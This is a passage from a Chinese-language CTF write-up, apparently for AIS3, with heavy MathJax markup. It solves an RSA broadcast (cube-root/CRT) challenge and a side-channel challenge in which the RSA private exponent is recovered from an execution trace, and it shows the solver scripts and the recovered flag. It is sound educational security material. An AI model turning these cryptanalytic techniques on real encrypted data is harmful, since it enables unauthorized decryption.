287Z"></path></g><g data-mml-node="mn" transform="translate(911,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></g></svg></mjx-container> 會最多有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="8.422ex" height="1.581ex" role="img" focusable="false" viewBox="0 -677 3722.4 699"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500,0)"></path></g><g data-mml-node="mo" transform="translate(2222.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mn" transform="translate(3222.4,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></svg></mjx-container> bits, 才需那麼多. 有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.974ex" height="1.91ex" role="img" focusable="false" viewBox="0 -833.2 1314.6 844.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(911,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></g></svg></mjx-container> 後開三次根號就是答案.</p><h5 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">17935355045244019490994492432435078429294046251373323301585537322989608726599418940604843251550239023980998311728768997695693089131010900893235900887590212600595741575337369513831853193340939894267175265316621595189752898884409205735873777841812933207986932820853959773951748633160244390308066988893527341438890606835915667383415049929217987156437656986481365462249326168872270217130454437422973489362615889797711617293473704020132500177003659781007225808737166682873140234666587224740240960288511824717267049839054778803790345742436792768175611893752708481498793007811955664359334027626940837899254752692471794408099</span></span><br><span class="line">c1 = <span class="number">6220915806191210242551008526108657415752065366710694358169827792335969535651047878222193017863473222629117087234271587999464217022755970213122313561391711999242215611452622888209273727428564243483892942109709838890536214538883955915468337854038595286818752930160800208111427677307764318451169677036639572590967397377086154919396911868176492896715182316482102094171761566452788811889045545761646570940167984459999088791549788532217428488745529026477596464277478434441148637281740589003905313430010674913460460316394201269220173873970013790899309665072815516080093015807317879643831380207153972400498912617668079507747</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20479773183463311680125142127251874593139348193547954772151757237858384947941738090585356648916256305873804780721604147304052361169532713439034591992420050865350477978680824058053433682592614064467076893745184899439384936889013287402718688505983806758400592699598248119113188663849673095275115692714565145944275222307393940140824766069057966266164131294661651917327054536641067360976694602049669398842967345233485643959446500818963175589103472392722876279386953745475353330326240453521164262676823145927209506490195680571166209595117198977403247442790429329937882881658218739614629837284166936132479757967754721962497</span></span><br><span class="line">c2 = <span class="number">18958530450278070988355583843466929786679959080456379193734375716894685184392730651980116086278614045986895967581841928377436588469230202745259481589862916395341834431487024306576580294591410326563998228597808493222798564716861082133924015762439215458319248708464724874622133839457700575557023297293290218842551641797606296722355143594287329298064673605377140785616208379890149842261105460683144549275408869727614454111377742698251503376045766242971496034560331965791004923428977495250247406245126486981445302183253363162814378328529422924952280311230595190926601919692436449143073475514609514777465757810203067869433</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">30450840269446905642620193060425614302586476191143921678597995038191926390364060601339586677285272951378456479213536629459330180893079893344522815499666158297970645319638631030993672405782943881569838444709483316447174897976977393478439046590022968671672245880254921681596899389831220754214676219873432770815923461367329594676088198155825940497812999083960382512409354323224817058114740356177691510738016066778588152199551050099698474388708084206285022359394838031759232787603683849326773435972407791254512251348972310069242677992594091747084550541314172168252218296345505855615365814097638938803861165103791176836489</span></span><br><span class="line">c3 = <span class="number">19106588099594826747059621817889071541697165806909364418973354068351477429212640582391229826418696618789770707906825958295177069373424072554389443328741416146517612901388007923839322639121731816209273748633014141073748661292565059631176895373722423460887879998999188700856554961374509771603100940708443217407913624958550426048693133815747938827818987143566005757310199511121982493454481375590566099866318568266359443079879066638201231273846428636522117192490408021874375771803362241815420279443739121276999052249298784404462072229024268996519148054389938836578926024211997392447127547861084852505826566885226390220208</span></span><br><span class="line"></span><br><span class="line">c = crt([c1, c2, c3], [n1, n2, n3])</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">r = gmpy2.iroot(<span class="built_in">int</span>(c), <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">long_to_bytes(<span class="built_in">int</span>(r[<span class="number">0</span>]))</span><br><span class="line"><span class="string">b'====================================================================================================AIS3{C0pPerSmI7HS_Sh0r7_pad_a7T4cK}===================================================================================================='</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="Baby-Side-Channel"><a href="#Baby-Side-Channel" class="headerlink" title="Baby Side Channel"></a>Baby Side Channel</h3><h4 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">powmod</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    r = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b &amp; <span class="number">1</span>:</span><br><span class="line">            r = r * a % c</span><br><span class="line">        a = a * a % c</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">b</span>):</span><br><span class="line">    p = getPrime(b // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(b // <span class="number">2</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> n, e, d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = os.environ.get(<span class="string">"FLAG"</span>, <span class="string">"not_flag{just_test}"</span>).encode()</span><br><span class="line"></span><br><span class="line">    n, e, d = keygen(<span class="number">2048</span>)</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">    c = powmod(m, e, n)</span><br><span class="line">    <span class="keyword">assert</span> powmod(c, d, n) == m</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{c = }</span>"</span>)</span><br><span class="line"></span><br><span class="line">    ed = powmod(e, d, n)</span><br><span class="line">    de = powmod(d, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{ed = }</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{de = }</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="comment"># to generate trace.txt.gz:</span></span><br><span class="line">    <span class="comment"># execute `python -m trace --ignore-dir=$(python -c 'import sys; print(":".join(sys.path)[1:])') -t chall.py | gzip &gt; trace.txt.gz`</span></span><br></pre></td></tr></table></figure></div><p>根據 <a class="link" href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_side_channel/">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_side_channel/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> , RSA 有 side-channel attack 可以洩漏出 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>.</p><p>需要關注 <code>powmod</code> 部分, 觀察到 trace 裡面有哪些地方沒有執行到 <code>chall.py(9)</code> 可以推測出 <code>b</code> 的目前 lsb 是否為 1. 所以可以還原所有有進到 <code>powmod</code> 指數部分的數, 包含 <code>e, d</code>.</p><p>底下是在執行 <code>powmod</code> 時的部分 trace, 上半部分沒有執行到 <code>chall.py(9)</code>, 所以 <code>b&amp;1==0</code>, 下半部則是相反, 所以那兩個時候的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container> 的 lsb 分別是 0, 1, 就還原出兩個 bits 了.</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chall.py(7):     while b &gt; 0:</span><br><span class="line">chall.py(8):         if b &amp; 1:</span><br><span class="line">chall.py(10):         a = a * a % c</span><br><span class="line">chall.py(11):         b &gt;&gt;= 1</span><br><span class="line">chall.py(7):     while b &gt; 0:</span><br><span class="line">chall.py(8):         if b &amp; 1:</span><br><span class="line">chall.py(9):             r = r * a % c</span><br><span class="line">chall.py(10):         a = a * a % c</span><br><span class="line">chall.py(11):         b &gt;&gt;= 1</span><br></pre></td></tr></table></figure></div><p>所以寫了一個 parse trace 的 script.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'trace.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    trace = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">M = <span class="built_in">dict</span>()</span><br><span class="line">collecting = <span class="literal">False</span></span><br><span class="line">target = <span class="literal">None</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(trace):</span><br><span class="line">    line = trace[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">' --- modulename: chall, funcname: powmod'</span> <span class="keyword">in</span> line:</span><br><span class="line">        target = trace[i-<span class="number">1</span>]</span><br><span class="line">        recovered_num = <span class="number">0</span></span><br><span class="line">        j = i+<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(j)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'return r'</span> <span class="keyword">in</span> trace[j+<span class="number">1</span>]:</span><br><span class="line">                i = j+<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'chall.py(9):             r = r * a % c'</span> <span class="keyword">in</span> trace[j+<span class="number">2</span>]:</span><br><span class="line">                recovered_num += <span class="number">1</span></span><br><span class="line">                j += <span class="number">5</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'chall.py(10):         a = a * a % c'</span> <span class="keyword">in</span> trace[j+<span class="number">2</span>]:</span><br><span class="line">                j += <span class="number">4</span></span><br><span class="line">            recovered_num &lt;&lt;= <span class="number">1</span></span><br><span class="line">        res = recovered_num &gt;&gt; <span class="number">0</span></span><br><span class="line">        res = <span class="built_in">bin</span>(res)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">        res = <span class="built_in">int</span>(res, <span class="number">2</span>)</span><br><span class="line">        M[target] = res</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">{</span></span><br><span class="line"><span class="string">    'chall.py(30):     c = powmod(m, e, n)':           18, </span></span><br><span class="line"><span class="string">    'chall.py(31):     assert powmod(c, d, n) == m': 2047,     </span></span><br><span class="line"><span class="string">    'chall.py(34):     ed = powmod(e, d, n)':        2047,     # =&gt; 2**2045 &lt;= d &lt; 2**2046</span></span><br><span class="line"><span class="string">    'chall.py(35):     de = powmod(d, e, n)':          18      # =&gt; 2**16   &lt;= e &lt; 2**17</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></div><p>有了 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container> 之後還要找到 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> 才能解密. 我們有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="19.31ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 8535.2 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(600,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msup" transform="translate(878,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mo" transform="translate(2016.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(3017.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(3406.1,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mspace" transform="translate(4322.8,0)"></g><g data-mml-node="mi" transform="translate(5156.5,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 